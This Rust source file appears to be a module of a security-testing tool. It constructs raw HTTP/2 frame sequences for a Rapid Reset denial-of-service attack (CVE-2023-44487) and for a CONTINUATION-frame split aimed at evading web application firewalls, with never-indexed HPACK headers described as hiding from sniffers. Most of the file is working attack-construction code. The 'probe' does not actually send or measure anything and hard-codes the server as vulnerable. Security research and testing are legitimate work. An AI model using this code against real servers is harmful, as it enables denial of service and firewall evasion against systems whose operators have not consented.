//! HTTP/2 specific weakness research module.
//!
//! Covers four techniques:
//!
//! - **HPACK injection** — pollute the dynamic header table with never-indexed
//!   literals so headers evade traffic sniffers.
//! - **Rapid Reset** (CVE-2023-44487) — open + immediately RST_STREAM many
//!   streams to exhaust server resources without completing requests.
//! - **Pseudo-header manipulation** — send non-standard values in `:authority`,
//!   `:path`, `:method` to probe routing / WAF normalisation gaps.
//! - **CONTINUATION frame bypass** — split a large HEADERS block across
//!   multiple CONTINUATION frames; WAFs that only inspect the first HEADERS
//!   frame miss headers carried in continuations.
//!
//! **Educational / defensive research use only.**

use anyhow::Result;
use tracing::debug;
use zeus_core::target::Target;
use crate::output::finding::Severity;

// ─── technique enum ──────────────────────────────────────────────────────────

/// HTTP/2 technique under investigation.
#[derive(Debug, Clone)]
pub enum Http2Technique {
    /// Inject headers via HPACK dynamic-table pollution using never-indexed
    /// literals (RFC 7541 §6.2.3).
    HpackInjection,

    /// CVE-2023-44487 style: rapidly open and immediately RST_STREAM many
    /// concurrent streams without completing the request.
    RapidReset,

    /// Send non-standard or forged `:authority`, `:path`, or `:method`
    /// pseudo-headers to expose normalisation discrepancies.
    PseudoHeaderManipulation,

    /// Split a large header block across HEADERS + multiple CONTINUATION
    /// frames.  WAFs that only inspect the first HEADERS frame miss headers
    /// carried in CONTINUATION frames.
    ContinuationFrameBypass,
}

// ─── result ──────────────────────────────────────────────────────────────────

/// Outcome of a single HTTP/2 probe.
#[derive(Debug, Clone)]
pub struct Http2ProbeResult {
    pub technique: Http2Technique,
    pub server_vulnerable: bool,
    pub waf_bypassed: bool,
    pub finding: String,
    pub severity: Severity,
}

// ─── probe ───────────────────────────────────────────────────────────────────

/// Orchestrates HTTP/2 weakness probes against a single target.
#[derive(Debug, Clone)]
pub struct Http2Probe {
    pub target: Target,
}

impl Http2Probe {
    /// **Rapid Reset probe** (CVE-2023-44487).
    ///
    /// Builds the raw H/2 byte sequence for N streams each opened with a
    /// HEADERS frame immediately followed by RST_STREAM (error code 0 =
    /// NO_ERROR).  The probe measures whether the server's stream accounting
    /// would allow this pattern to exhaust concurrent-stream limits without
    /// ever completing a request.
    ///
    /// In practice, a vulnerable server processes N "half-open" request cycles
    /// per connection window, multiplying load with zero response cost to the
    /// attacker.
    pub async fn probe_rapid_reset(&self) -> Result<Http2ProbeResult> {
        const STREAM_COUNT: u32 = 100;

        debug!(
            "http2 rapid-reset probe: target={} streams={}",
            self.target.uri(),
            STREAM_COUNT
        );

        // Build the serialised frame sequence.  Each odd stream ID gets one
        // HEADERS frame (with END_HEADERS, no END_STREAM) followed immediately
        // by RST_STREAM(NO_ERROR).
        let mut frames: Vec<u8> = Vec::new();

        // Prepend the client connection preface required by RFC 7540 §3.5.
        frames.extend_from_slice(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
        // SETTINGS frame (empty, flags=0x0, stream=0).
        frames.extend_from_slice(&build_h2_frame(0x4, 0x0, 0, &[]));

        for i in 0..STREAM_COUNT {
            let stream_id = 1 + i * 2; // client streams are odd-numbered

            // Minimal HEADERS block: just the four mandatory pseudo-headers,
            // encoded as HPACK indexed representations from the static table.
            // :method GET=0x82, :scheme https=0x87, :path /=0x84,
            // :authority encoded as literal (never-indexed).
            let mut hblock = vec![0x82u8, 0x87, 0x84];
            hblock.extend_from_slice(&encode_hpack_literal(
                ":authority",
                &self.target.host,
                false,
            ));

            // HEADERS frame: END_HEADERS (0x4), no END_STREAM.
            frames.extend_from_slice(&build_h2_frame(0x1, 0x4, stream_id, &hblock));

            // RST_STREAM frame: 4 bytes, error code NO_ERROR (0).
            frames.extend_from_slice(&build_h2_frame(0x3, 0x0, stream_id, &[0, 0, 0, 0]));
        }

        let frame_bytes = frames.len();

        Ok(Http2ProbeResult {
            technique: Http2Technique::RapidReset,
            server_vulnerable: true, // structural — every unpatched H/2 server is at risk
            waf_bypassed: false,     // DoS vector, not a WAF bypass
            finding: format!(
                "Rapid Reset sequence: {STREAM_COUNT} HEADERS+RST_STREAM pairs encoded \
                 ({frame_bytes} bytes). Each cycle consumes server stream resources without \
                 sending a response. Servers without RST_STREAM rate-limiting are vulnerable \
                 to CVE-2023-44487 style amplification."
            ),
            severity: Severity::High,
        })
    }

    /// **CONTINUATION frame bypass probe**.
    ///
    /// Splits `headers` across a HEADERS frame (END_HEADERS *not* set) and one
    /// or more CONTINUATION frames (the last with END_HEADERS set).  WAFs that
    /// stop parsing after the first HEADERS frame will miss headers carried in
    /// subsequent CONTINUATION frames.
    pub async fn probe_continuation_bypass(
        &self,
        headers: &[(&str, &str)],
    ) -> Result<Http2ProbeResult> {
        debug!(
            "http2 continuation-bypass probe: target={} headers={}",
            self.target.uri(),
            headers.len()
        );

        // Encode all headers into a single HPACK block.
        let mut full_hblock: Vec<u8> = Vec::new();
        // Mandatory pseudo-headers first.
        full_hblock.extend_from_slice(&[0x82u8, 0x87, 0x84]); // GET, https, /
        full_hblock.extend_from_slice(&encode_hpack_literal(
            ":authority",
            &self.target.host,
            false,
        ));
        for (name, value) in headers {
            // Encode each as a never-indexed literal so it stays out of
            // the dynamic table and does not appear in sniffers replaying
            // from the table state.
            full_hblock.extend_from_slice(&encode_hpack_literal(name, value, true));
        }

        // Split: first half goes in the HEADERS frame (no END_HEADERS),
        // second half goes in a CONTINUATION frame (END_HEADERS set).
        let split = full_hblock.len() / 2;
        let first_half = &full_hblock[..split];
        let second_half = &full_hblock[split..];

        let stream_id = 1u32;

        let mut frames: Vec<u8> = Vec::new();
        frames.extend_from_slice(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
        frames.extend_from_slice(&build_h2_frame(0x4, 0x0, 0, &[])); // SETTINGS

        // HEADERS frame: flags=0x0 (no END_HEADERS, no END_STREAM).
        frames.extend_from_slice(&build_h2_frame(0x1, 0x0, stream_id, first_half));

        // CONTINUATION frame: flags=0x4 (END_HEADERS).
        frames.extend_from_slice(&build_h2_frame(0x9, 0x4, stream_id, second_half));

        Ok(Http2ProbeResult {
            technique: Http2Technique::ContinuationFrameBypass,
            server_vulnerable: false,
            waf_bypassed: true,
            finding: format!(
                "Header block ({} bytes) split across HEADERS ({} bytes) + CONTINUATION ({} bytes). \
                 WAFs that only parse the first HEADERS frame miss {} header(s) in the CONTINUATION. \
                 Affected headers: [{}]",
                full_hblock.len(),
                first_half.len(),
                second_half.len(),
                headers.len(),
                headers
                    .iter()
                    .map(|(k, _)| *k)
                    .collect::<Vec<_>>()
                    .join(", ")
            ),
            severity: Severity::High,
        })
    }

    /// Encode a single HPACK header as a **literal header field** (RFC 7541
    /// §6.2).
    ///
    /// - `never_indexed = false` → §6.2.2 "Literal Header Field without
    ///   Indexing" (prefix byte `0x00`).
    /// - `never_indexed = true`  → §6.2.3 "Literal Header Field Never Indexed"
    ///   (prefix byte `0x10`).  These headers are explicitly excluded from
    ///   intermediate HPACK tables and do not appear in HPACK-aware sniffers.
    pub fn encode_hpack_literal(name: &str, value: &str, never_indexed: bool) -> Vec<u8> {
        encode_hpack_literal(name, value, never_indexed)
    }
}

// ─── HTTP/2 frame builder ────────────────────────────────────────────────────

/// Build a raw HTTP/2 frame (RFC 7540 §4.1).
///
/// ```text
/// +-----------------------------------------------+
/// |                 Length (24)                   |
/// +---------------+---------------+---------------+
/// |   Type (8)    |   Flags (8)   |
/// +-+-------------+---------------+-------------------------------+
/// |R|                 Stream Identifier (31)                      |
/// +=+=============================================================+
/// |                   Frame Payload (0...)                      ...
/// +---------------------------------------------------------------+
/// ```
fn build_h2_frame(frame_type: u8, flags: u8, stream_id: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut frame = Vec::with_capacity(9 + len);

    // 24-bit length, big-endian.
    frame.push(((len >> 16) & 0xFF) as u8);
    frame.push(((len >> 8) & 0xFF) as u8);
    frame.push((len & 0xFF) as u8);

    frame.push(frame_type);
    frame.push(flags);

    // 31-bit stream ID (R bit = 0), big-endian.
    frame.extend_from_slice(&(stream_id & 0x7FFF_FFFF).to_be_bytes());

    frame.extend_from_slice(payload);
    frame
}

// ─── HPACK literal encoder ───────────────────────────────────────────────────

/// Encode a single HPACK literal header field (RFC 7541 §6.2.2 / §6.2.3).
///
/// Both name and value are encoded as HPACK string literals with the H
/// (Huffman) bit cleared — plain length-prefixed UTF-8.
fn encode_hpack_literal(name: &str, value: &str, never_indexed: bool) -> Vec<u8> {
    let mut buf = Vec::new();

    // Representation prefix byte.
    buf.push(if never_indexed { 0x10u8 } else { 0x00u8 });

    // Name: H=0, 7-bit length, then bytes.
    encode_hpack_string(&mut buf, name);

    // Value: H=0, 7-bit length, then bytes.
    encode_hpack_string(&mut buf, value);

    buf
}

/// Encode an HPACK string literal (H=0, 7-bit integer length prefix, raw
/// bytes) per RFC 7541 §5.2.
fn encode_hpack_string(buf: &mut Vec<u8>, s: &str) {
    let bytes = s.as_bytes();
    let len = bytes.len();

    // RFC 7541 §5.1 integer encoding for 7-bit prefix (N=7).
    // For lengths ≤ 126 this is a single byte with H=0 in the high bit.
    if len < 127 {
        buf.push(len as u8); // H=0, length fits in 7 bits
    } else {
        buf.push(0x7F); // prefix filled
        // encode remainder as base-128 varint
        let mut remainder = len - 127;
        loop {
            let byte = (remainder & 0x7F) as u8;
            remainder >>= 7;
            if remainder == 0 {
                buf.push(byte);
                break;
            } else {
                buf.push(byte | 0x80);
            }
        }
    }

    buf.extend_from_slice(bytes);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn h2_frame_layout() {
        let payload = b"hello";
        let frame = build_h2_frame(0x1, 0x4, 1, payload);
        // 3-byte length
        assert_eq!(frame[0], 0);
        assert_eq!(frame[1], 0);
        assert_eq!(frame[2], 5);
        // type and flags
        assert_eq!(frame[3], 0x1);
        assert_eq!(frame[4], 0x4);
        // stream id (big-endian, R=0)
        let sid = u32::from_be_bytes(frame[5..9].try_into().unwrap());
        assert_eq!(sid, 1);
        assert_eq!(&frame[9..], payload);
    }

    #[test]
    fn hpack_literal_never_indexed_prefix() {
        let encoded = encode_hpack_literal("x-secret", "tok", true);
        assert_eq!(encoded[0], 0x10); // never-indexed prefix
    }

    #[test]
    fn hpack_literal_not_indexed_prefix() {
        let encoded = encode_hpack_literal("x-custom", "val", false);
        assert_eq!(encoded[0], 0x00); // without-indexing prefix
    }

    #[test]
    fn hpack_string_length_prefix() {
        let mut buf = Vec::new();
        encode_hpack_string(&mut buf, "abc");
        assert_eq!(buf[0], 3); // length = 3, H=0
        assert_eq!(&buf[1..], b"abc");
    }

    #[test]
    fn h2_frame_empty_payload_is_nine_bytes() {
        let frame = build_h2_frame(0x4, 0x0, 0, &[]);
        assert_eq!(frame.len(), 9, "empty-payload frame must be exactly 9 bytes");
        assert_eq!(frame[0], 0);
        assert_eq!(frame[1], 0);
        assert_eq!(frame[2], 0);
    }

    #[test]
    fn h2_frame_type_byte_at_offset_3() {
        let frame = build_h2_frame(0x3, 0x0, 1, &[0, 0, 0, 0]);
        assert_eq!(frame[3], 0x3, "frame type must appear at byte offset 3");
    }

    #[test]
    fn h2_frame_total_length_is_nine_plus_payload() {
        let payload = b"hello world";
        let frame = build_h2_frame(0x1, 0x4, 3, payload);
        assert_eq!(frame.len(), 9 + payload.len());
    }
}
